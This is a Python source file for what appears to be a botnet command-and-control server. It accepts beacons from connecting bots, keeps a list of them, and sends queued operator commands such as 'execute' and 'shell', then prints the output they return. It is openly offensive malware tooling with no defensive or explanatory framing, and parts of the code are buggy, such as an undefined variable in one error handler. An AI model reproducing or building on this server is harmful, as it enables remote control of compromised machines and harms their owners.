import socket
import sys
import struct
from time import sleep
from threading import Thread

commands = ["get os","test","execute","shell"]
inter = 5
check_list = {}     #Collection of dictionaries of commands
botnet = []
command = ""
has_cmd = 0 # 1 --> True 0 --> False

# def set_vals(n,name):
#     global check_list,botnet
#     for bot in botnet:
#         for key in check_list:
#             if check_list[key] =

def beacon_handler(s,addr):
    global inter,command,has_cmd,check_list
    try:
        pkt = s.recv(4096)
        len_meta_data = len(pkt) - 4
        data = struct.unpack("<HH",pkt[len_meta_data:])
        if data[0] == 1:
            if has_cmd == 1:
                create_checklist(command)
                if check_list[command][addr] != 1:
                    beacon_pkt = struct.pack("<%dsHH"%(len(command)),command.encode(),has_cmd,inter)
                else:
                    beacon_pkt = struct.pack("<HH",has_cmd,inter)
                # set_vals(1,command)
            cmd_data = struct.unpack("<%ds"%(len_meta_data),pkt[:len_meta_data])
            cmd_data = cmd_data[0].decode()
            print(cmd_data)
            check_list[command][addr] = 1
        elif data[0] == 0:
            if has_cmd == 1:
                create_checklist(command)
                if check_list[command][addr] != 1:
                    beacon_pkt = struct.pack("<%dsHH"%(len(str(command))),command.encode(),has_cmd,inter)
                else:
                    beacon_pkt = struct.pack("<HH",has_cmd,inter)
            else:
                beacon_pkt = struct.pack("<HH",has_cmd,inter)
        s.send(beacon_pkt)
    except socket.error:
        print("[*] Error in beacon_handler : %s"%(str(ee)))
        sys.exit(0)
    command = ""

def create_checklist(name):
    global botnet,check_list,command
    command = str(command)
    if command in check_list.keys():
        return
    #check_valid_command(command,return1=True) = {}
    addr_dicts = {}
    for bot in botnet:
        addr_dicts[bot] = 0
    check_list[command] = addr_dicts

def check_command():
    global command,has_cmd
    if command != "":
        has_cmd = 1

def check_bot(addr):
    global botnet
    for bot in botnet:
        if addr == bot:
            return
    botnet.append(addr)
    print("[*] New bot %s added"%(addr))

def start_server(ip="127.0.0.1",port=2003):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.bind((ip,port))
        s.listen(5)
        while True:
            #print("[*] Listening...")
            bot,addr = s.accept()
            check_bot(str(addr[0]))
            print("[*] Beacon from %s received"%(str(addr[0])))
            beacon_handler_thread = Thread(target=beacon_handler,args=(bot,str(addr[0])))
            beacon_handler_thread.start()
            #print("[*] beacon_thread started")
    except Exception as e:
        print("[*] Error in start_server : %s"%(str(e)))
        sys.exit(0)

def check_valid_command(cmd,return1=False):
    global commands
    for c in commands:
        if c in cmd:
            if return1:
                return c
            return True
    return False

def process_cmd(cmd):
    global command,has_cmd
    if check_valid_command(cmd):
        has_cmd = 1
        command = cmd
    else:
        return


def main():
    try:
        server_thread = Thread(target=start_server,args=())
        server_thread.start()
        print("[*] Server started!")
        while True:
            cmd = input(">>")
            process_cmd(cmd)
    except Exception as e:
        print("[*] Error in main : %s"%(str(e)))
        sys.exit(0)

if __name__ == '__main__':
    main()
